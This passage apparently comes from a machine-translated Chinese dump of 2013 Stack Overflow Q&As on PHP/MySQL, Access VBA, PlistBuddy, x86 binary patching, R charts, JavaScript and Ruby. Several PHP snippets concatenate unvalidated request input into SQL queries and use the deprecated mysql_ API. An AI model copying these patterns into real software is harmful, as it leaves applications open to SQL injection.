      -- ajax settings --
    }).success(function(data) {
        // do something with our results
        doSomething(data);
        // Fire again to get the next set of results. 
        setTimeout(function() {pollAjax()}, 10);
   });
}这意味着您不太可能用 1000 个待处理的 ajax 请求挂起浏览器它会询问结果，当它得到它们时，它将询问下一组结果。

```

# postgresql - 我该如何优化：许多 Postgres 触发器在事务中调用相同的函数

> ID：14903809
> 
> 赞同：1
> 
> 时间：2013-02-15T21:44:26.503
> 
> 标签：postgresql, triggers

我的一个数据库表中有一个缓存字段，该字段根据许多不同的表和这些表中的字段状态进行更新。

这些表中的每一个都通过触发器调用相同的函数：updateCachedField(basetable_id INTEGER)。updateCachedField 函数查询所有这些其他表并计算基表的新缓存值。updateCachedField 函数很复杂，而且成本很高。

在单个事务期间，可能会更改许多影响缓存字段的表。因此，在单个事务中，updateCachedField 函数可能会被调用 50 次……但只有 5 个不同的 basetable_id。

有没有办法对此进行优化，以便 updateCachedField 函数只被调用 5 次而不是 50 次以上？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-27T02:28:09.887

我认为您最好的选择是使用基于 xmin 值或其他信息的可延迟约束触发器和查询。实际上，您还可以复制“日志”数据以在其他地方进行快照。

如果没有明确的信息，它并不清楚您在看什么，但一种选择是基本上拥有三组表：

1.  活表。更新（增量或其他聚合有用的信息）在更新或插入时写入日志表。

2.  日志表。这些只是附加的。

3.  聚合快照表，定期聚合新的日志表集。

然后，您可以获得一个实时视图，该视图将显示当前聚合数据，仅从最后一个快照聚合。

# ms-access - 无法使用新记录在 Access 表单中设置字段值

> ID：14903812
> 
> 赞同：3
> 
> 时间：2013-02-15T21:44:39.150
> 
> 标签：ms-access, vba

当我打开访问表单*ActivityTracker*到新记录时，我希望它使用当前时间 now() 自动填充字段 *start_time*。

```
Private Sub Form_Open(Cancel As Integer)
    If IsNull(Form_ActivityEntry.Start_time) And IsNull(Form_ActivityEntry.id) Then
        Form_ActivityEntry.Start_time = Now()
    End If
End Sub 
```

这会引发错误“您无法为该对象赋值”并停止执行。

我可以通过明确转到新记录来修复错误

```
Private Sub Form_Open(Cancel As Integer)
    If IsNull(Form_ActivityEntry.Start_time) And IsNull(Form_ActivityEntry.id) Then
        DoCmd.RunCommand acCmdRecordsGoToNew
        Form_ActivityEntry.Start_time = Now()
    End If
End Sub 
```

或通过

```
Private Sub Form_Open(Cancel As Integer)
    If IsNull(Form_ActivityEntry.Start_time) And IsNull(Form_ActivityEntry.id) Then
        Me.Recordset.AddNew
        Form_ActivityEntry.Start_time = Now()
    End If
End Sub 
```

但其中任何一个都会导致弹出警告，“您无法转到指定的记录。”

我试图用这个来抑制警告

```
 DoCmd.SetWarnings False
    DoCmd.RunCommand acCmdRecordsGoToNew
    DoCmd.SetWarnings True 
```

或通过设置错误处理，

```
 On Error GoTo Err_SomeName 
```

但我仍然收到警告。

AllowAdditions 设置为 True。记录集类型是动态集。

否则，此表单一切正常。

我究竟做错了什么？是否有一个名为“打开新记录”而不是“打开表格”的事件？

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-16T23:28:25.563

这里的问题仍然没有人正确回答为什么发布的代码不起作用。

原因是您正在使用 on-open 事件。

与 .net 不同，大多数系统访问具有出色的设计，其中当您打开表单事件（可以取消）和加载事件时，您会发生两个事件。

Access 的这一出色设计意味着可以将用于测试条件和防止表单加载的代码放在 on-open 事件中。如果您查看 CLOSE，您会看到 on-open 甚至有一个取消。如果您设置 cancel = true，则 FORM 不会加载，也不会显示。

所以，你可以测试没有数据，或者用户权限等等，然后小屋取消表单加载。如果您可以取消表单加载，那么允许修改绑定控件的值就没有什么意义了——因为所有绑定控件都是只读的。

不允许在 on-open 事件中更改 BOUND 控件的值。这太快了，是产品的设计和意图。

因此，测试条件以防止表单加载进入打开状态。

因此，这表明变量的设置、控件的设置、控件的设置值和您的基本表单启动代码属于 ON-LOAD 事件。开放时间太早了。

当然，如果您的代码要取消表单加载，那么您的所有表单启动和设置代码都不应该并且不需要运行是合乎逻辑的。

总之

**开场活动：**

可以设置 cancel = true 代码在这里测试您是否希望阻止表单加载并被用户看到。

**加载事件：**

您的所有启动代码、变量设置、控件设置等现在都已被推荐并成为可能。

Access 中的这种简单设计还意味着，作为开发人员，您现在知道在哪里寻找可以阻止和取消表单加载的代码。当然，如果没有对 Access 中存在差异和为什么两个事件的基本理解，那么海报和给出的答案的混乱就会变得很明显。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-15T21:46:55.323

我建议您将控件的默认值设置为 Now() 或 Date()。默认值仅适用于新记录，一旦您完成任何其他字段，该值将被分配。

在这种特殊情况下，甚至还有一个参数用于设置表中字段的默认值。

请不要使用设置警告：[DoCmd.SetWarnings 和 CurrentDB.Execute 有什么区别](https://stackoverflow.com/questions/11213892/whats-the-difference-between-docmd-setwarnings-and-currentdb-execute/11213943#11213943)

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-02-15T23:16:07.720

我不喜欢在表格上移动到新记录。可能会发生太多数据漏洞，您会遇到像您这样的问题。

对于您要添加的每个字段，我建议使用一个空白的、未绑定的表单，其中包含一个文本框、日历控制、向下编号……等等。这样，您可以键入检查每个字段或根据您的需要进行其他检查。然后，当用户满意时，使用插入查询添加记录。

但是，对于您提出的问题。看起来您正在尝试为绑定字段分配一个值。尝试将值分配给字段绑定到的对象。

# php - PHP mysql COUNT不返回而不是0

> ID：14903815
> 
> 赞同：0
> 
> 时间：2013-02-15T21:44:42.393
> 
> 标签：php, mysql, count

我正在尝试检查名称是否存在。查询应返回 0，因为该字段为空但返回 1。帮助。

```
function profile_exists($user) { //checks that profile exists
    $profile_ex = mysql_query(
        "SELECT COUNT(profile_name) FROM user_info WHERE id = '{$user}'");

    if(!confirm_query($profile_ex)) {
        return false;   
    } else {
        if (mysql_result($profile_ex, 0) == 1) {
            echo mysql_result($profile_ex, 0);
            exit;
            return true;
        } else {
            return false;
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-15T22:07:46.467

您有一行而不是 0 行，因为`COUNT(*)`返回一行数据，在这种情况下计数值为 0。

您将需要运行查询，然后检查计数的值。

例子：

```
$result = mysql_query("SELECT COUNT(*) AS count FROM ...");
$row = mysql_fetch_assoc($result);

if( $row['count'] == 0){
    return False;
}else{
    return True;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-15T21:51:47.530

你的语法看起来有点复杂，试试这个：

```
$profile_ex = mysql_query("SELECT * FROM user_info WHERE id = '$user'");
$profile_ex = mysql_num_rows($profile_ex);

if ( $profile_ex > 0 ) {
echo "exists"; } else {
echo "doesn't exist";
} 
```

希望这可以帮助

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-15T21:46:26.070

您应该使用`mysqli_`或`PDO`使用准备好的语句来防止 SQL 注入。

它将始终返回 1，因为您使用的是聚合函数 ( `COUNT`)。而是从表中选择一列：

```
SELECT profile_name FROM ... 
```

但是，如果您只对检查配置文件是否存在感兴趣，请使用`mysqli_num_rows`. 如果您想检查配置文件是否存在并返回数据，请使用`mysqli_fetch_assoc`.

# terminal - 使用 Shell 脚本写入 plist Dictionary child Boolean

> ID：14903817
> 
> 赞同：2
> 
> 时间：2013-02-15T21:44:52.910
> 
> 标签：terminal, boolean, defaults

我正在尝试在基于 Platypus 脚本的应用程序 (Mac) 中修改系统 plist，尽管我觉得我的问题可能有更一般的答案。

问题是：在 plist 文件中定位和修改 Dictionary 键的布尔子项的正确终端语法是什么？

我试过了：

```
sudo defaults write /private/var/db/launchd.db/com.apple.launchd.peruser.501/overrides.plist com.github.norio-nomura.SIMBL-Agent Disabled -bool false 
```

但它不喜欢 -bool 与 Disabled 那里..

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T10:08:39.143

我设法通过使用 PlistBuddy 来解决它。PlistBuddy 内置在 MacOS X 10.5 及更高版本中。

我本可以使用：

```
/usr/libexec/PlistBuddy -c "set :com.github.norio-nomura.SIMBL-Agent:Disabled bool" /private/var/db/launchd.db/com.apple.launchd.peruser.501/overrides.plist 
```

但它在 .pkg 安装程序中导致了错误，所以我使用了：

```
/usr/libexec/PlistBuddy -c "Delete :com.github.norio-nomura.SIMBL-Agent" /private/var/db/launchd.db/com.apple.launchd.peruser.501/overrides.plist 
```

.. 接着：

```
/usr/libexec/PlistBuddy -c "Add :com.github.norio-nomura.SIMBL-Agent:Disabled bool" /private/var/db/launchd.db/com.apple.launchd.peruser.501/overrides.plist 
```

..就在这似乎工作之后。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-12-09T00:20:57.733

**PlistBuddy 在设置值时不需要类型**

```
/usr/libexec/PlistBuddy -c "set :com.github.norio-nomura.SIMBL-Agent:Disabled true" /private/var/db/launchd.db/com.apple.launchd.peruser.501/overrides.plist 
```

# php - 使用 javascript 和 php 创建一个 onChange 选择下拉菜单，但它不起作用

> ID：14903822
> 
> 赞同：2
> 
> 时间：2013-02-15T21:45:02.760
> 
> 标签：php, javascript, sql, onchange

我要做的是在苏格兰创建一个由32个不同位置的下拉容器。一个 div WHERE 位置 = 格拉斯哥。

我没有错误消息或任何类型的识别我的代码已经工作，因为当我在下拉列表中选择四个中的一个时，它绝对没有任何作用。

可以来清理并纠正我到目前为止所做的事情吗？我会非常感激！

这是我正在使用的文件：

头文件.php

```
<html>
<head>
<script src="http://code.jquery.com/jquery.min.js"></script>
<script type="text/javascript">
    $(document).ready(function(){
        $('#location').change(function(){
            //Retrieve Content from the back-end PHP page, and pass the ID selected
            var url = 'location.php?location=' + $(this).val();
            $('#txtHint').load(url);
        });
    });
</script>

</head>
<body>
     <div id="header">
        <div class="headerLeftContent">
            <select id='location'>
                    <option href="Link to a dynamic page with all the content from glasgow" value="Glasgow">Glasgow</option>
                    <option href="Link to a dynamic page with all the content from x" value="x">x</option>
                    <option href="Link to a dynamic page with all the content from test" value="test">test</option>
                    <option href="Link to a dynamic page with all the content from edinburgh" value="Edinburgh">Edinburgh</option>
            </select>
            <div id='txtHint'></div>
        </div>          
    </div>

</body>
</html> 
```

位置.php

```
<?php
$connect = mysql_connect('xxxxxx', 'xxxxxx', 'xxxxxx');
$select_db = mysql_select_db('xxxxxx');

$location = $_REQUEST['location'];

$query = "SELECT * FROM podContent WHERE location = '.$location.'";

while($row = mysql_fetch_array($query))
{
echo $row['text'];
}

mysql_close($connect);

?> 
```

并且请任何关于“SQL注入”或“mysql”应该如何成为“PDO”的评论，因为我明白这一点，但我现在只是在测试并会修改它。

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-15T23:09:25.337

您在 MySQL 查询中连接您的位置名称似乎有一个错误，并且它不匹配任何内容（因此没有任何内容被`echo`返回）。改变这个：

```
$query = "SELECT * FROM podContent WHERE location = '.$location.'"; 
```

至

```
$query = "SELECT * FROM podContent WHERE location = '$location'"; 
```

（除非你的数据库中有类似的东西`.Glasgow.`......）

然后你必须`mysql_query($query)`按照 Alon 的建议打电话。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T21:54:25.883

您需要使用 mysql_query 并将资源传递给 mysql_fetch_array 函数：

```
$query = "SELECT * FROM podContent WHERE location = '.$location.'";
$result = mysql_query($query);
while($row = mysql_fetch_array($result))
 {
    echo $row['text'];
 } 
```

# linux - 如何在不破坏对齐的情况下在 linux 可执行文件中添加/删除 x86 指令

> ID：14903823
> 
> 赞同：2
> 
> 时间：2013-02-15T21:45:09.447
> 
> 标签：linux, x86, executable, binaryfiles

我是二进制和汇编的新手，我很好奇如何直接编辑二进制可执行文件。我试图从二进制文件中删除一条指令（根据提供的反汇编指令`objdump`），但在这样做之后，“可执行文件”似乎不再是可执行格式（运行时出现分段错误；`gdb`无法识别）。我听说这是由于指令对齐问题。（是吗？）

那么，是否可以直接在 linux 可执行文件中添加/删除单个 x86 指令？如果是这样，怎么做？提前致谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-15T21:51:57.057

如果您删除了一大块二进制文件而没有相应地调整文件头，它将变得无效。

`NOP`幸运的是，您可以在不实际删除指令的情况下替换指令。文件大小保持不变，如果没有校验和或签名（或者如果没有实际检查），则无需执行更多操作。

插入指令没有通用的方法，但通常你用 a 覆盖原始代码 `JMP`到另一个位置，在那里你复制原始代码所做的事情，按照你的意愿做你自己的事情，然后`JMP`返回。如果不更改二进制文件的大小，可能无法为新代码找到空间，因此我会在加载可执行文件后修补代码（可能使用特殊的`LD_PRELOAD`ed 库）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-15T21:48:32.300

是的。只需将其替换为`NOP`指令 ( `0x90`) - 如果指令跨越多个字节，则将其替换为多个。这是一个老把戏。

# optimization - Paypal API 用户、密码、签名字段长度

> ID：14903828
> 
> 赞同：0
> 
> 时间：2013-02-15T21:45:19.220
> 
> 标签：optimization, paypal, datafield

我浏览了 Paypal 指南和 x.com 中的许多页面和 PDF，但我找不到任何有关 API 登录/连接的最大字段长度的参考。我看到事务 ID 最多为 19 个字符，但他们似乎避免说出访问字段的最大值。

我正在设置一个数据库表来保存多个 Paypal API 登录以及一个编辑它的部分，我将按长度进行验证。我想使用一些实际值而不是猜测 255 个字符。

在这方面肯定有人和我一样具体，我希望有人找到了这个答案。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T02:17:41.150

我一直选择 75，这似乎是安全的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-18T23:54:13.387

在[http://www.paypalobjects.com/en_US/ebook/PP_NVPAPI_DeveloperGuide/Appx_fieldreference.html](http://www.paypalobjects.com/en_US/ebook/PP_NVPAPI_DeveloperGuide/Appx_fieldreference.html)的 NVP API 方法和字段参考页面上，他们将 EMAIL 指示为“127 个单字节字符”。

至于其他项目，我没有看到任何记录的长度，但检查了 5 个客户帐户，似乎

API PWD 是 16 个字符 API 签名是 56 个字符 - 在每个帐户中（这些必须是固定长度）。

# php - PDO 绑定循环索引

> ID：14903831
> 
> 赞同：0
> 
> 时间：2013-02-15T21:45:33.677
> 
> 标签：php, pdo

我有一些用户上传的图片可以排序，需要保存图片位置。正在考虑我可以通过在迭代它们时使用循环索引来完成这项工作。但是，使用我的 $i 变量绑定第三个参数作为引用传递，我需要该值。我该如何解决这个问题？

这是代码：

```
$postId = $args['postId'];
$images = explode(",", $args['images']);

$sql = 'INSERT INTO post_image (name,postId,ordinal) VALUES ';
$part = array_fill(0, count($images), "(?, ?, ?)");
$sql .= implode(",", $part);
logit($sql);

try{
  $db = DB::getInstance();
  $stmt = $db->dbh->prepare($sql);
  $count = count($images);
  $n = 1;
  for($i = 0; $i < $count; $i++){
    $stmt->bindParam($n++, $images[$i]);
    $stmt->bindParam($n++, $postId);
    $stmt->bindParam($n++, $i);
  }
  $result = $stmt->execute();

  if($result !== false) {
    return true;
  }else {
    logit('Query Failed');
    return false;
  }
}catch(PDOException $e) {
   logit($e->getMessage());
   return false;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-15T22:03:17.143

我通过使用 bindValue 作为第三个参数来修复它。

# php - 如果第一个数组具有来自第二个数组的值，则 PHP 返回结果

> ID：14903838
> 
> 赞同：0
> 
> 时间：2013-02-15T21:45:47.827
> 
> 标签：php, arrays, multidimensional-array

我有两个数组。第一个直接来自我的原始数据。每个项目都是时间线的一个点。

```
print_r($items) 
```

返回

```
 Array
(
    [0] => Array
        (
            [id] => 1173
            [month] => January
            [year] => 2013
            [description] => This is a test
            [link] => #
            [image] => http://s3.amazonaws.com/stockpr-test-store/esph2/db/Timeline/1173/image_resized.jpg
        )

    [1] => Array
        (
            [id] => 1183
            [month] => February
            [year] => 2013
            [description] => This is another test
            [link] => 
        )

    [2] => Array
        (
            [id] => 1193
            [month] => December
            [year] => 2012
            [description] => Testing another year
            [link] => #
        )

) 
```

我有第二个数组，可以从该数组中获取所有独特的年份。

```
print_r($years) 
```

返回

```
 Array
(
    [0] => 2013
    [2] => 2012
) 
```

那么我怎样才能度过这些年，然后每年归还与那一年相匹配的项目？

所以，对于 2012 年，我会从 $items 数组中得到 [2]。对于 2013 年，我会从 $items 数组中得到 [0] 和 [1]。

我在这一切都错了吗？我想要做的就是有这样的输出：

```
<h1>Timeline</h1>
<h2>2013</h2>
<ul>
  <li>ID No. 1173</li>
  <li>ID No. 1183</li>
</ul>
<h2>2012</h2>
<ul>
  <li>ID No. 1193</li>
</ul> 
```

*编辑：*

目前使用：

```
<? foreach($years as $year) : ?> 
                <div class="year row clearfix" id="y-$year">
                    <h3><span><?= $year ?></span></h3>
    <? foreach($items as $item) : ?>
         <? if($item['year'] == $year) : ?>
                    <div class="item span5">
                        <div class="padding">
                            <div class="text">
                            <h4><?= $item['month']?> <?= $item['year'] ?></h4>
                            <p><?= $item['description'] ?></p>
                            </div>
                        </div>
                    </div>
         <? endif; ?>
    <? endforeach; ?>
                </div>
<? endforeach; ?> 
```

但这似乎有点低效。据我所知，每次尝试输出一个项目时，它都会遍历整个数组。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T21:51:19.217

嘿，

我不确定我是否正确理解了你的问题，但你可以试试这个：

```
foreach($years as $aYear){ 
   foreach($items as $aItem){
     if($aItem['year'] == $aYear){
        echo $aItem['description'];
      }
   }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T21:52:38.833

像这样的东西应该工作：

```
$years = ['2013','2012'];

for ($i = 0; $i < count($items); $i++) 
{
  if (in_array($years, $items[$i]['year']))
  {
    // do something with $items[$i]
  }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-15T22:34:37.747

```
 //new array
 $array2 = array();
   foreach($array as $key)
   {
    $year =  $array[$key]['year'];
    //if year has already been used dont erase what's already in each part, add to it
   if(array_key_exists($year, $array2))
     {
       array_push($array2[$year]['ids'],$array[$key]['id']);
       //do rest
     }
   else 
     {
       //if year hasnt been set as a key yet, then it's empty
       $array2[$year]['ids'] = array($array[$key]['id']);
       //do rest of your vars to populate it
     }

   } 
```

如果您不喜欢对密钥进行硬编码，请随意使用 foreach 并再次检查是否使用过。如果有可能不是数组中的每个索引（如您的示例中）都具有相同的数字/键，您必须在推送嵌套数组键之前仔细检查。（id，描述，月份）

数组 2 的输出应该是：

```
Array(
   [2013] => array
   (
       [ids] => array
       ( 
         [0] => 1234
         [1] => 5667
       ) 
      [months] => array
      ( 
         [0] => January
      )
    )

) 
```

希望现在您的阵列以您可以更轻松地使用的方式组织。稍后会测试。

# uitableview - 动态 UITableView 不滚动

> ID：14903839
> 
> 赞同：0
> 
> 时间：2013-02-15T21:45:49.143
> 
> 标签：uitableview, dynamic, scroll, reloaddata

我浏览了一些关于此的帖子，但没有一个能真正解决我遇到的问题。

不少人建议：

```
self.tableView.scrollEnabled = YES; 
```

但是，这不能让我滚动。

单元格是动态更新的，因此在我正在做的“测试”中调用了几次 reloadData。完成后，将根据数组的长度创建单元格，此时它们会离开屏幕底部。我希望滚动是自动的，但没有这样的运气。

如果某些代码有用，请告诉我，任何建议都会很棒

谢谢

# emacs - 按第二个字母显示键绑定

> ID：14903844
> 
> 赞同：1
> 
> 时间：2013-02-15T21:46:11.210
> 
> 标签：emacs, elisp, key-bindings

我想知道，在 Emacs 中哪些键以第二个字母为界。例如，我喜欢查找所有具有第二个字母“p”的键绑定。它应该返回我 Cx p、Cc p、Ch p 等。

像“Ch b by 2nd letter”之类的东西会非常有用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-16T03:16:21.880

`C-h``b`
`M-x` `occur` `RET` `^\S-+ b` `RET`

# r - 向 chartSeries 图形添加垂直线

> ID：14903848
> 
> 赞同：4
> 
> 时间：2013-02-15T21:46:24.427
> 
> 标签：r, quantmod

我希望这不是多余的，因为我已经广泛搜索并且仍然没有找到答案。我正在绘制日内数据，并希望在特定时间点放置一条垂直线。看来我必须使用函数 addTA 但它总是在我的图表下方绘制一些奇怪的空白区域。这是一些示例代码和数据。谢谢你的帮助。

数据：

```
date,value
29-DEC-2010:00:02:04.000,99.75
29-DEC-2010:00:03:44.000,99.7578125
29-DEC-2010:00:05:04.000,99.7578125
29-DEC-2010:00:07:53.000,99.7421875
29-DEC-2010:00:07:57.000,99.71875
29-DEC-2010:00:09:20.000,99.7421875
29-DEC-2010:00:11:04.000,99.75
29-DEC-2010:00:12:56.000,99.7421875
29-DEC-2010:00:13:05.000,99.7421875 
```

代码：

```
#set up data
data    = read.csv("foo.csv")
values  = data[,2]
time    = c(strptime(data[,1],format="%d-%b-%Y:%H:%M:%S",tz="GMT"))
dataxts = xts(values, order.by=time,tzone="GMT")

# chart data
chartSeries(dataxts)
# add vertical line - this is where I have no clue what's going on.
addTA(xts(TRUE,as.POSIXlt("2010-12-29 00:11:00",tz="GMT"),on=1)) 
```

最终发生的事情是，我在我想要的地方得到了一条垂直线，2010-12-29 00:11:00，但它位于图表下方的一个新部分中，而不是覆盖在它上面。有任何想法吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-16T05:14:52.310

您将`on`作为参数传递给`xts`，但您应该将其传递给`addTA`.

我认为你的意思是这样做：

```
addTA(xts(TRUE,as.POSIXlt("2010-12-29 00:11:00",tz="GMT")),on=1) 
```

也就是说，它仍然不适用于您的示例数据。但是，如果您所拥有的内容适用于您的真实数据，除了它将该行放在一个新面板中，那么这应该可以工作并且不会打开一个新面板。

我的[qmao 包](http://r-forge.r-project.org/R/?group_id=1113)中有一个[`addVLine`函数](http://r-forge.r-project.org/scm/viewvc.php/pkg/qmao/R/addVLine.R?view=markup&root=twsinstrument)，它本质上是一样的。

* * *

### 编辑

除了带括号的错字之外，xts 对象还需要一个列名才能`addTA`工作（我认为……至少在这种情况下）。此外，您必须提供图表上存在的 x 值（即 11:04，而不是 11:00）

```
colnames(dataxts) <- "x"
chartSeries(dataxts)
addTA(xts(TRUE,as.POSIXlt("2010-12-29 00:11:04",tz="GMT")),on=1, col='blue')
# or
# library(qmao)
# addVLine(index(dataxts[7])) 
```

### 编辑 2

也许更好的方法是使用该`addLines`功能

```
addLines(v=7) 
```

或者，如果您知道时间，但不知道行号，您可以这样做

```
addLines(v=which(index(dataxts) == as.POSIXlt("2010-12-29 00:11:04", tz="GMT"))) 
```

这使

![在此处输入图像描述](../Images/99d2f1ab4b2fafcc5e4f1f61c6a663a0.png)

# javascript - 将对象数组转换为数组数组

> ID：14903849
> 
> 赞同：4
> 
> 时间：2013-02-15T21:46:25.217
> 
> 标签：javascript, jquery, arrays, json, client-side

我希望有人会在这里为我指明正确的方向。我有一个数组，其中包含许多具有日期、设置和值作为属性的对象。
我需要在客户端将其转换为数组数组，其中每个成员数组都保存如下数据：[日期，集合 0 的值，集合 1 的值]
我正在寻找一种可以与任意数量的“ Sets”，这对我来说很复杂。任何提议的解决方案都可能需要 jQuery 或您使用的其他一些 javascript 库集来完成此操作。我没有问题，让我们完成它。:)
请参考下面的初始和结束数据集：

第一个只有两组：

```
var data = [  
    { Date: "2/10/2013", Set: 0, Value: 1 },   
    { Date: "2/10/2013", Set: 1, Value: 0 },   
    { Date: "2/11/2013", Set: 0, Value: 15 },   
    { Date: "2/11/2013", Set: 1, Value: 8 },   
    { Date: "2/12/2013", Set: 0, Value: 12 },    
    { Date: "2/12/2013", Set: 1, Value: 11 },    
    { Date: "2/13/2013", Set: 0, Value: 15 },   
    { Date: "2/13/2013", Set: 1, Value: 19 },   
    { Date: "2/14/2013", Set: 0, Value: 10 },    
    { Date: "2/14/2013", Set: 1, Value: 20 }   
];

var endData = [
    [ "2/10/2013", 1, 0 ],  
    [ "2/11/2013", 15, 8 ],  
    [ "2/12/2013", 12, 11 ],  
    [ "2/13/2013", 15, 19 ],  
    [ "2/14/2013", 10, 20 ]  
]; 
```

这是 3 组的示例。因此，例如，如果数据是这样的：

```
var data = [
    { Date: "2/10/2013", Set: 0, Value: 1 },   
    { Date: "2/10/2013", Set: 1, Value: 2 },  
    { Date: "2/10/2013", Set: 2, Value: 3 },   
    { Date: "2/11/2013", Set: 0, Value: 10 },  
    { Date: "2/11/2013", Set: 1, Value: 15 },   
    { Date: "2/11/2013", Set: 2, Value: 20 }  
]; 
```

返回的数组需要是这样的：

```
var endData = [  
    [ "2/10/2013", 1, 2, 3 ],  
    [ "2/10/2013", 10, 15, 20 ]  
]; 
```

任何指针表示赞赏。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-15T21:58:57.167

使用循环和全局`dat`变量来跟踪您在列表中的位置：

```
var endData=[], dat='', row=[];
for (var i=0; i<data.length; i++) {
    var obj=data[i], val=obj.Value;
    if (dat!=obj.Date) {
        if (i) endData.push(row);
        dat = obj.Date;
        row = [dat, val];
    } else {
        row.push(val);
    }
}
endData.push(row); // last one 
```

[http://jsfiddle.net/mblase75/rgJbq/](http://jsfiddle.net/mblase75/rgJbq/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-15T21:57:46.433

```
;(function() {
    var data = [  
        { Date: "2/10/2013", Set: 0, Value: 1 },   
        { Date: "2/10/2013", Set: 1, Value: 0 },   
        { Date: "2/11/2013", Set: 0, Value: 15 },   
        { Date: "2/11/2013", Set: 1, Value: 8 },   
        { Date: "2/12/2013", Set: 0, Value: 12 },    
        { Date: "2/12/2013", Set: 1, Value: 11 },    
        { Date: "2/13/2013", Set: 0, Value: 15 },   
        { Date: "2/13/2013", Set: 1, Value: 19 },   
        { Date: "2/14/2013", Set: 0, Value: 10 },    
        { Date: "2/14/2013", Set: 1, Value: 20 }   
    ];

    var endData = {};

    for (var i = 0; i < data.length; ++i) {
        var date = data[i].Date;

        if (endData[date] === undefined)
            endData[date] = [];

        endData[date].push(data[i].Value);
    }

    var finalData = [];

    for (var ed in endData) {
        var a = [ed];

        for (var i = 0; i < endData[ed].length; ++i) {
            a.push(endData[ed][i]);
        }

        finalData.push(a);
    }

    console.log(finalData);
})(); 
```

输出如下所示：

```
var finalData = [
    ["2/10/2013", 1, 0],
    ["2/11/2013", 15, 8],
    ["2/12/2013", 12, 11],
    ["2/13/2013", 15, 19],
    ["2/14/2013", 10, 20]
]; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-15T22:08:16.520

```
var endData = [];
var indexes = {};

for(var i = 0, len = data.length; i < len; i++) {
    if(indexes[data[i].Date] === undefined) {
        indexes[data[i].Date] = endData.length;
        endData.push([data[i].Date]);
    }
    endData[indexes[data[i].Date]][data[i].Set + 1] = data[i].Value;
} 
```

# ruby - 正则表达式多个匹配

> ID：14903854
> 
> 赞同：-2
> 
> 时间：2013-02-15T21:46:48.270
> 
> 标签：ruby, regex

我有以下内容：

```
"word1 word2 word3 (compound word) ..." 
```

我需要一个正则表达式将单词分隔成一个数组，将括号中的单词视为一个单词，其余的由空格分隔。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-15T22:41:38.517

```
BARE_WORD     = /([^\(\s]\S*)/
COMPOUND_WORD = /\(([^\)]*)\)/
SCANNER       = /(?:#{BARE_WORD})|(?:#{COMPOUND_WORD})/

def split_bare_and_parenthesized_words str
  str.scan(SCANNER).flat_map(&:compact)
end

split_bare_and_parenthesized_words "word1 word2 word3 (compound word) ..."
#=> ["word1", "word2", "word3", "compound word", "..."] 
```

此实现不会处理嵌套的括号。对于常规语言，这样的条件本质上是困难的。

（编辑：@DavidUnric 指出 OP 暗示他不希望结果中有括号。所以我们添加 captures 和 flat_map 以减少匹配的替代项。）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T22:39:27.687

由于 split 也可以采用 RegExp，因此可以根据要求轻松拆分字符串：

```
irb> "word1 word2 word3 (compound word)".split(/ *\((.*)\) *| /)
=> ["word1", "word2", "word3", "compound word"] 
```

IE。由任意数量的空格或单个空格包围的括号分割。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-16T05:14:48.177

```
"word1 word2 word3 (compound word) ...".scan(/\(.*?\)|\S+/) 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2013-02-15T22:33:21.530

试试这个：http: [//jsfiddle.net/WtfCA/](http://jsfiddle.net/WtfCA/)

```
function test(str) {
    var bracketStr = str.match(/\([a-z]*\s[a-z]*\)/g, "temp")[0];
    var temp = str.replace(/\([a-z]*\s[a-z]*\)/g, "temp").split(" ");
    var final = temp.join("+").replace(/temp/, bracketStr).split("+");
    console.log(final);
} 
```

# x86-16 - 用汇编级语言对超过 2 个字符串进行排序

> ID：14903858
> 
> 赞同：0
> 
> 时间：2013-02-15T21:47:13.640
> 
> 标签：x86-16

我有一个汇编级语言程序，它比较 2 个字符串，但我需要比较 10 个字符串。我如何实现这一目标？我的字符串比较程序在一个过程中。

```
; segments

data segment
data1 db 64 ,? ,64  dup(?)
data2 db 64 ,? ,64  dup(?)
data3 db 64 ,? ,64  dup(?)
data4 db 64 ,? ,64  dup(?)
data5 db 64 ,? ,64  dup(?)
data6 db 64 ,? ,64  dup(?)
data7 db 64 ,? ,64  dup(?)
data8 db 64 ,? ,64  dup(?)
data9 db 64 ,? ,64  dup(?)
data10 db 64 ,? ,64  dup(?)
ends

stack segment
    dw  128 dup(0)
ends

code segment
  main proc far
; set segment registers:

mov ax, data
mov ds, ax
move es,ax
call input
check data1,data2

; gets input from user
input proc
    lea dx, enter
        mov ah,09h
        int 21h
        call newline

        mov ah, 0ah
        lea dx,data1
        int 21h
        call newline

       mov ah, 0ah
       lea dx,data2
       int 21h
       call newline

       mov ah, 0ah
      lea dx,data3
      int 21h
      call newline

     mov ah, 0ah
    lea dx,data4
    int 21h
    call newline

    mov ah, 0ah
    lea dx,data5
    int 21h
    call newline

   mov ah, 0ah
   lea dx,data6
  int 21h
  call newline

 mov ah, 0ah
 lea dx,data7
 int 21h
